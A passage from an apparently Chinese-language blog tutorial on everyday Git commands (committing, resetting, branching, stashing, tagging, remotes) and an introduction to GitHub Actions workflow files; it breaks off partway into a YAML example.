class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">git <span class="hljs-built_in">add</span> readme.txt<br>git status<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/d3116a46055b4857adac67fdec182985.png" alt="image-20221209205137932"></p><ul><li>文件进入暂存区后，操作已被记录，但是还没有合并到仓库上，这个时候使用<code>git commit</code>就将操作合并到仓库上，<code>-m</code>表示添加注释，一般会写明本次提交都做了啥。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> commit -m <span class="hljs-string">&quot;create readme.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/f647a142d2ae4366ac8c60b20f859c28.png" alt="image-20221209205406728"></p><p>当然<code>git commit</code>可以使用空的注释，这需要额外的参数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> commit --<span class="hljs-literal">allow</span>-empty-message -m <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>从上述两个步骤中，我们可以大致看出git基本流程：<code>git add</code>命令实际上就是一个保存记录的过程，git版本控制也是由<code>git add</code>实现的，当我们保存了很多条操作记录时，就可以使用<code>git commit</code>保存操作记录。</p><h3 id="查看操作记录"><a href="#查看操作记录" class="headerlink" title="查看操作记录"></a>查看操作记录</h3><p>现在我们对<code>readme.txt</code>进行修改保存，再次查看git状态。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git status</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/d449bb01eff747639d2283e26aff0b4f.png" alt="image-20221209210929874"></p><p>可以看到git已经检测到文件修改了，但是还没有实际进行保存。此时我们可以使用<code>git diff readme.txt</code>查看修改了什么。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">diff</span> readme.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/be6d936357d4474ab9f66d114efa79b8.png" alt="image-20221209222251961"></p><p>现在我们可以看到我们对文件进行的所有修改，我们可以使用<code>git add</code>和<code>git commit</code>进行提交。</p><p><strong>个人的思考</strong></p><p>从上述两个基本操作，我们可以大概的将git看作是一个历史记录保存器，我们对文件的每一个字符的修改都会保存为一个字符历史记录，但是这样保存的话，字符历史记录就会太多太复杂了，因此git让我们使用<code>git add</code>显示的指定保存时间点（即历史记录分界线），git后台会将所有上次保存点至当前保存点的所有字符历史记录合并为某一行的操作，这就出现了<code>+</code>和<code>-</code>，这样字符历史记录就被合并为某个版本信息了，当然对同一个文件的多次<code>git add</code>最终会被合并为一次修改，如果没有进行<code>git commit</code>，某一次的<code>git add</code>是无法恢复的；我们使用<code>git commit</code>将保存的历史记录写入仓库，整个版本库操作就完成了。</p><h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><p>当我们发现最近编写的内容出现问题时，我们想要删除<strong>工作区修改</strong>，如何进行操作呢？</p><p>在没有使用git时，我们常用的办法就是一行行手工判断是否是修改的，并重新改回去，现在我们有了git那就方便多了，<code>git checkout -- &lt;filename&gt;</code>可以将指定的文件恢复至上一次保存的状态，无论是添加到暂存区的状态还是提交到仓库的状态都可以进行恢复，当然以最新的一次状态为准，总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。从此处我们可以看出无论是<code>git add</code>还是<code>git commit</code>最好确保代码完善后再进行add或commit操作，否则版本回退可能会无法直接运行。</p><p>那如果我们想要<strong>撤销暂存区</strong>里的内容呢？</p><p>那就应该使用<code>git restore --staged &lt;filename&gt;</code>或<code>git reset HEAD</code>把文件从暂存区移动到工作区，<strong>保留文件最后一次修改的内容</strong>。</p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>如果我们想进一步回退本地仓库的版本呢？我们首先对文件进行再一次的修改并提交至版本库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">add</span> readme.txt<br>git <span class="hljs-keyword">commit</span>-m &quot;版本回退测试&quot;<br></code></pre></td></tr></table></figure><p>此时，如果我们想回退到之前的版本怎么办呢?git提供了<code>git log</code>查看所有保存历史记录。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>可以看到git清楚的记录了每一次commit修改的内容和注释，<code>HEAD</code>表示我们当前处在的位置。</p><p><img src="https://img-blog.csdnimg.cn/direct/1038b7433dd8489caa049dc317cc3466.png" alt="image-20221210205410004"></p><p>ok，坐好了，我们要准备回退了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> [&lt;mode&gt;] [&lt;<span class="hljs-keyword">commit</span>&gt;]<br>&lt;mode&gt;: <br><span class="hljs-comment">--soft 版本恢复，回退版本版本修改内容会存在暂存中，相当于只回退了git commit，没有回退git add，源文件内容不会被修改</span><br><span class="hljs-comment">--mixed 版本恢复，回退版本不存在暂存区中，相当于回退了git commit和git add，源文件内容不会被修改</span><br><span class="hljs-comment">--hard 版本恢复，彻底恢复，于回退了git commit和git add，并且源文件内容会恢复之前的版本，此时针对现版本的修改都会丢失。</span><br>默认使用<span class="hljs-comment">--mixed</span><br>&lt;<span class="hljs-keyword">commit</span>&gt;:<br>需要恢复到的版本id或者HEAD^（当前版本的上一个版本）、HEAD^^（当前版本的上两个版本）、HEAD~<span class="hljs-number">100</span>（当前版本的上<span class="hljs-number">100</span>个版本）<br></code></pre></td></tr></table></figure><p>以下三种方式回退的示例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--soft HEAD^</span><br></code></pre></td></tr></table></figure><p>此时版本记录恢复到当前版本的上一版，回退版本修改记录存储在暂存区中，但是原文件内容不发生变化。</p><p><img src="https://img-blog.csdnimg.cn/direct/dee12f0cfd7c48daadf4f7d842fe7f66.png" alt="image-20221210212343275"></p><p>回到回退前的版本，我们使用<code>git relog</code>查看所有回退命令，可以找到我们回退前的版本id。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git reflog<br>git <span class="hljs-built_in">reset</span> --hard <span class="hljs-number">34724b2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/592b9fd6dfcc42b0a5eecbdcde807015.png" alt="image-20221210213505828"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--mixed HEAD^</span><br></code></pre></td></tr></table></figure><p>此时版本记录恢复到当前版本的上一版，回退版本修改内容不会存储在暂存区中，原文件内容不发生变化。</p><p><img src="https://img-blog.csdnimg.cn/direct/e8c65407f6e845d7a3d45b6ce9898eaa.png" alt="image-20221210212633862"></p><p>重新回退至回退前的版本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">reset</span> --hard <span class="hljs-number">34724b2</span><br>git <span class="hljs-built_in">reset</span> --hard HEAD^<br></code></pre></td></tr></table></figure><p>此时版本记录恢复到当前版本的上一版，回退版本修改内容不会存储在暂存区中，原文件内容发生变化，针对新版本的所有修改都会丢失。</p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>当我们不需要某个文件时，我们会使用<code>rm</code>进行删除，但实际上我们有两种选择，一是确实要从版本库中删除某一文件，那就是使用<code>git rm</code>进行删除，并且<code>git commit</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">rm <span class="hljs-operator">&lt;</span>filename<span class="hljs-operator">&gt;</span><br>git <span class="hljs-keyword">add</span><br>git <span class="hljs-keyword">commit</span><br>git rm<br>git <span class="hljs-keyword">commit</span> <span class="hljs-operator">-</span>m &quot;文件删除&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/3dcd268109194b9c942dfde05d70aec6.png" alt="image-20221210223042741"></p><p>我们可以看到<code>rm</code>命令虽然在本地进行了删除，但是并未存入暂存区；<code>git rm</code>删除本地文件并存入暂存区准备<code>commit</code>，<code>git rm</code>与<code>rm</code>+<code>git add</code>等价。</p><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p>接下来，我们在<a href="https://github.com/">github</a>上创建一个远程仓库。</p><p><img src="https://img-blog.csdnimg.cn/direct/ccfb8032898b4cd2ae0257faec59e4e4.png" alt="image-20221211202131238"></p><p>这样远程就有一个仓库了但是并未与本地仓库相互关联，我们可以使用git登陆自己的账号，使用&#96;&#96;将本地仓库与远程仓库相互关联起来。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> remote <span class="hljs-keyword">add</span> origin https:<span class="hljs-comment">//github.com/oh-nice/learngit.git</span><br></code></pre></td></tr></table></figure><p>添加之后远程库的名字就是<code>origin</code>，这是git的默认叫法，也可以改成别的。下一步，就可以把本地库的所有内容推送到远程库上。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">push</span> -u <span class="hljs-built_in">origin</span> master<br></code></pre></td></tr></table></figure><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p><img src="https://img-blog.csdnimg.cn/direct/f596231aed5c4052a11569ad97b542ab.png" alt="image-20221211203930493"></p><p>从现在开始，只要本地作了提交，就可以通过命令：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">push</span> <span class="hljs-built_in">origin</span> master<br></code></pre></td></tr></table></figure><p>把本地<code>master</code>分支的最新修改推送至GitHub。</p><p><strong>删除远程仓库</strong></p><p>如果添加的时候远程仓库写错了，或者想删除远程仓库，可以先使用<code>git remote -v</code>查看远程仓库信息，再使用<code>git remote rm origin</code>删除远程仓库，<strong>值得注意的是</strong>，这里的删除是将本地仓库与远程仓库的关联删除，并不是真正的将远程仓库直接删除，如果想要直接删除远程仓库，需要到github网页进行删除。</p><h3 id="创建并合并分支"><a href="#创建并合并分支" class="headerlink" title="创建并合并分支"></a>创建并合并分支</h3><p>在git中，每次提交都会默认提交到<code>master</code>分支中，<code>master</code>就是主分支，而<code>HEAD</code>就是指向的当前分支，只有当前分支是主分支时，<code>HEAD</code>才指向<code>master</code>。</p><p><strong>个人思考：</strong>分支可以理解为更加高层面的历史记录分界线，区别于提交操作，分支具有多个平行提交继承于同一个提交的特性，个人看来这是分支具有的最大特色。</p><p>首先，我们先创建<code>dev</code>分支，然后切换到<code>dev</code>分支：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> checkout -<span class="hljs-keyword">b</span> dev<br></code></pre></td></tr></table></figure><p>-b 表示创建并切换，等价于</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">git branch <span class="hljs-built_in">dev</span><br>git chechout <span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>使用<code>git branch</code>可查看当前分支。</p><p><img src="https://img-blog.csdnimg.cn/direct/4ba2e7e59d2a4be1bfd454a5ced0afdb.png" alt="image-20221212215614738"></p><p>接下来，我们在<code>dev</code>分支下添加一些提交，并合并到<code>master</code>分支中。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git add readme.txt<br>git commit -m &#x27;dev分支修改&#x27;<br><span class="hljs-comment"># 切换回master分支合并dev分支</span><br>git chechout <span class="hljs-keyword">master</span><br><span class="hljs-title">git</span> merge dev<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/ccfc82453c1941a38d801108a7fe1e81.png" alt="image-20221212220441665"></p><p>默认情况下git会进行快进模式的合并，即直接把<code>master</code>的指针指向<code>dev</code>，合并就完成了，此时就可以放心的删除<code>dev</code>分支了；</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git branch -d dev</span><br></code></pre></td></tr></table></figure><p>但是当<code>master</code>和<code>dev</code>分支出现冲突时，快进模式无法解决冲突的，比如<code>master</code>和<code>dev</code>有不同的提交记录，此时我们就需要手动解决冲突合并。</p><p>我们创建<code>dev</code>分支，并提交一次修改记录;</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> checkout -<span class="hljs-keyword">b</span> dev<br><span class="hljs-symbol">git</span> <span class="hljs-keyword">add</span> readme.txt<br><span class="hljs-symbol">git</span> commit -m <span class="hljs-string">&quot;dev提交记录&quot;</span><br></code></pre></td></tr></table></figure><p>之后我们切换回<code>master</code>分支，再次提交一次不同修改内容的记录。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git checkout <span class="hljs-keyword">master</span><br><span class="hljs-title">git</span> add readme.txt<br>git commit -m <span class="hljs-string">&quot;master提交记录&quot;</span><br></code></pre></td></tr></table></figure><p>此时我们将分支合并</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">git merge <span class="hljs-built_in">dev</span><br>git branch -d <span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/e48825bc78da41a1b374491085bb0812.png" alt="image-20221212221951269"></p><p>会发现合并分支报错，要求我们解决冲突问题，此时我们打开冲突文件，可以看到git使用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>、<code>=======</code>、<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标识了两次提交记录。</p><p><img src="https://img-blog.csdnimg.cn/direct/abb36113028d4b14bb42074518082ada.png" alt="image-20221212222147126"></p><p>此时我们可以选择保存某一个分支，或者手动输入保存的内容从而解决冲突。</p><p>使用<code>git log --graph</code>能够查看分支合并图</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">git log</span> <span class="hljs-literal">--</span><span class="hljs-comment">graph</span> <span class="hljs-literal">--</span><span class="hljs-comment">pretty=oneline</span> <span class="hljs-literal">--</span><span class="hljs-comment">abbrev</span><span class="hljs-literal">-</span><span class="hljs-comment">commit</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/89b89b5923304d0a84b03b250b62ea11.png" alt="image-20221212222759189"></p><h3 id="现场保存"><a href="#现场保存" class="headerlink" title="现场保存"></a>现场保存</h3><p>现在设想一下如下场景：</p><p>我正在编写一个新的功能，此时主分支程序出现了bug，需要紧急修复，而我的新功能还未完成，如果此时使用<code>git add</code>和<code>git commit</code>保存的话，分支上就会出现一些功能不完善的提交，这对整个分支来说可能会造成混乱，因此最好能够暂时保存当前工作现场，而不是提交不完善的代码，幸好，git提供给我们<code>stash</code>功能，通过此功能我们可以将当前的工作现场储藏起来，等以后恢复现场继续工作。</p><p>保存工作区现场</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git stash</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/577650967f3f49d5979378e50d4bb22b.png" alt="image-20221213121510288"></p><p>此时我们已经成功保存工作区现场，使用<code>git stash list</code>可以查看所有保存现场。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git stash list</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/6cbbf69cf3244b6f8d91d237858a54fa.png" alt="image-20221213121620615"></p><p>这是我们对主分支进行bug修复</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">git checkout -<span class="hljs-keyword">b </span><span class="hljs-keyword">bugFix</span><br><span class="hljs-keyword"></span>git <span class="hljs-keyword">add </span>readme.txt<br>git commit -m <span class="hljs-string">&quot;fix bug&quot;</span><br>git checkout master<br>git merge <span class="hljs-keyword">bugFix</span><br><span class="hljs-keyword"></span>git <span class="hljs-keyword">branch </span>-d <span class="hljs-keyword">bugFix</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/30b37c72aa3a4cc8a0ef7eb49de669cf.png" alt="image-20221213122143615"></p><p>然后回到我们的开发分支，恢复现场</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">git stash apply <span class="hljs-symbol">stash@</span>&#123;<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>之后需要使用<code>git stash drop</code>进行删除保存现场，也可以使用<code>git stash pop</code>恢复并删除现场，但是此时的<code>dev</code>分支并未应用<code>bugFix</code>的提交，我们可以使用<code>git cherry-pick &lt;commit&gt;</code>将某一特定提交复制到当前分支，之后便会重新进行合并操作。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> cherry-pick bcb32<br></code></pre></td></tr></table></figure><p><strong>注意：</strong>现场储藏功能似乎仅支持储藏工作区文件，暂存区内容会被清空。</p><h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><p><strong>查看远程库信息</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git remote -v</span><br></code></pre></td></tr></table></figure><p><strong>推送分支</strong></p><p>指定推送的分支</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">push</span> <span class="hljs-built_in">origin</span> master<br>git <span class="hljs-built_in">push</span> <span class="hljs-built_in">origin</span> dev<br></code></pre></td></tr></table></figure><p><strong>拉取分支</strong></p><p>在本地创建和远程对应的分支</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">git checkout -b branch-<span class="hljs-keyword">name</span> origin/branch-<span class="hljs-keyword">name</span><br></code></pre></td></tr></table></figure><p>建立本地分支与远程分支的关联</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">git branch --<span class="hljs-keyword">set</span>-upstream branch-<span class="hljs-keyword">name</span> origin/branch-<span class="hljs-keyword">name</span><br></code></pre></td></tr></table></figure><h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签实际上就是某个commit提交记录，因为提交记录的id过长，所以采用标签方便记录。</p><p><code>git tag</code>默认是打在最新提交的commit上的，如果想要打在其他commit，只需要添加commitid即可</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">tag</span> <span class="hljs-title">&lt;tagname</span>&gt;<br>git <span class="hljs-keyword">tag</span> <span class="hljs-title">-a</span> <span class="hljs-tag">&lt;tagname&gt;</span> -m <span class="hljs-string">&quot;message&quot;</span><br></code></pre></td></tr></table></figure><p>标签删除</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 删除本地标签</span><br>git tag -d &lt;tagname&gt;<br><span class="hljs-comment"># 删除远程标签</span><br>git push origin <span class="hljs-symbol">:refs/tags/v0</span>.<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>提交标签至远程仓库</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># 提交指定标签</span><br>git <span class="hljs-keyword">push</span> origin &lt;tagname&gt;<br><span class="hljs-meta"># 提交全部标签</span><br>git <span class="hljs-keyword">push</span> origin --tags<br></code></pre></td></tr></table></figure><h2 id="Git高级操作"><a href="#Git高级操作" class="headerlink" title="Git高级操作"></a>Git高级操作</h2><h3 id="Git处理换行符问题"><a href="#Git处理换行符问题" class="headerlink" title="Git处理换行符问题"></a>Git处理换行符问题</h3><p>​当我们在Windows和Linux系统中同时进行git开发时，可能会出现大量文件修改但是，实际上没有内容更改的情况，原因就是Windows和Linux的换行符不统一问题。</p><p>Unix系统里，每行结尾只有“&lt;换行&gt;”，即”n”；Windows系统里面，每行结尾是“&lt;换行&gt;&lt;回车&gt;”</p><p><strong>解决方法</strong></p><p>方法一：</p><p>在项目的 <code>.gitattributes</code> 文件中添加以下内容:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">* <span class="hljs-attribute">text</span>=auto <span class="hljs-attribute">eol</span>=lf<br>*.&#123;cmd,[cC][mM][dD]&#125; text <span class="hljs-attribute">eol</span>=crlf<br>*.&#123;bat,[bB][aA][tT]&#125; text <span class="hljs-attribute">eol</span>=crlf<br></code></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">git config --global core.<span class="hljs-built_in">auto</span>crlf <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>强制全局转换换行符，签出时将换行符转换成CRLF，签入时转换回 LF。</p><h3 id="创建新的空白分支"><a href="#创建新的空白分支" class="headerlink" title="创建新的空白分支"></a>创建新的空白分支</h3><p>在使用git时，有时候我们可能需要创建一个新的分支，用于存放本项目的其他文件，这个时候我们就需要一个提交完全空白的分支，但是git只提供了在当前分支基础上创建新分支的命令，需要达到我们的目的需要一些手法操作。</p><ul><li><p>使用<code> git checkout</code>的<code>--orphan</code>参数创建新分支</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">git checkout <span class="hljs-comment">--orphan uHook</span><br></code></pre></td></tr></table></figure><p>该命令会创建一个名为uHook的分支，并且该分支下有前一个分支下的所有文件，但是当前分支不会指向任何以前的提交。</p></li><li><p>我们不想提交任何内容，所以我们需要把当前内容全部删除，用git命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">rm</span> -rf .<br></code></pre></td></tr></table></figure></li><li><p>使用<code>git commit</code>提交新分支</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> commit -am <span class="hljs-string">&quot;new branch for uHook&quot;</span><br></code></pre></td></tr></table></figure><p>如果没有任何文件提交的话，分支是看不到的，可以创建一个新文件后再次提交则新创建的branch就会显示出来。</p></li><li><p>使用branch来查看分支是否创建成功。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">git branch -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="Github-Actions"><a href="#Github-Actions" class="headerlink" title="Github Actions"></a>Github Actions</h2><h3 id="Github-Actions简介"><a href="#Github-Actions简介" class="headerlink" title="Github Actions简介"></a>Github Actions简介</h3><p>​Github Actions是持续集成和持续交付（CI&#x2F;CD）的自动化平台。简而言之，Github Actions可以自动化编译、运行、测试提交的代码，同时也可以自动化的部署。</p><p><strong>Github Actions基本概念</strong></p><ul><li>workflow</li></ul><p>​workflow是一组预先配置完成的自动化进程，主要包括自动运行的jobs。Workflows默认存储在项目库根路径下的<code>.github/workflows</code>目录中，每一个 workflow对应一个具体的.yml 文件（或者 .yaml）。</p><ul><li>Runner</li></ul><p>​Runner是工作流运服务器的代称。Github官方提供Ubuntu、Windows、macOS三种系统运行工作流。当然Github也提供自搭建服务器的方式运行工作流。</p><ul><li>jobs:</li></ul><p>​本工作流中的所有任务，一个job是工作流中运行在同一环境（Runner）下的一组步骤，同一job中的步骤是按顺序执行的，也就是说步骤之间可以存在依赖关系。</p><p>​但是job之间默认不存在先后关系，job之间是并行运算的，因此运行环境也不同步。如果如要设置job之间的依赖关系的话，也可以使用<code>jobs.&lt;job_id&gt;.needs</code>进行配置。</p><ul><li>Actions</li></ul><p>​Actions是Github Actions平台设置的一些常用基本操作，例如拉去和推送等操纵。Actions也是可以自定义和发布的。</p><h3 id="YAML基本语法"><a href="#YAML基本语法" class="headerlink" title="YAML基本语法"></a>YAML基本语法</h3><p>由于Github Actions是使用<code>YAML</code>配置的，因此创建Github Actions前先介绍一下<code>YAML</code>基本语法。</p><p><code>YAML</code>的配置文件后缀为<code>.yml</code>，如<code>main.yml</code></p><p><strong>基本语法</strong></p><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tap，只允许1空格</li><li>缩进的空格数不重要，只要相同的层级的元素左对齐即可</li><li><code>#</code>表示注释</li><li>以 <strong>-</strong> 开头的行表示构成一个数组</li></ul><h3 id="Github-Actions的使用"><a href="#Github-Actions的使用" class="headerlink" title="Github Actions的使用"></a>Github Actions的使用</h3><p>在项目库根路径下的<code>.github/workflows</code>目录中创建<code>.yml</code>文件，该文件就是一个工作流的配置文件：</p><ul><li><code>name</code></li></ul><p>​可选。Workflow的名字，默认为工作流的名字，在Github Actions页面显示该name。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">my-first-actions</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/990ae7f221f2477aaf6ffd8e395afe27.png" alt="image-20230223103500766"></p><ul><li><code>run-name</code></li></ul><p>​可选。某一Workflow运行时显示的名称， 在某一Github Actions标签下，每次运行时会显示。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">run-name:</span> <span class="hljs-string">Mr.Robot</span> <span class="hljs-string">is</span> <span class="hljs-string">learning</span> <span class="hljs-string">Github</span> <span class="hljs-string">Actions</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/eabe70c6c8df4129be7da6a60e0e7ec7.png" alt="image-20230223103705607"></p><ul><li><code>on</code></li></ul><p>​工作流触发时机，可以选择在代码库进行操作时触发，比如<code>pull</code>、<code>push</code>、<code>pull_request</code>等等，详情请见<a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">官方文档</a>，这里展示<code>workflow_dispatch</code>的用法，<code>workflow_dispatch</code>可以手动触发<code>workflows</code>并进行相应的配置，可以使用inputs表明可选选项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 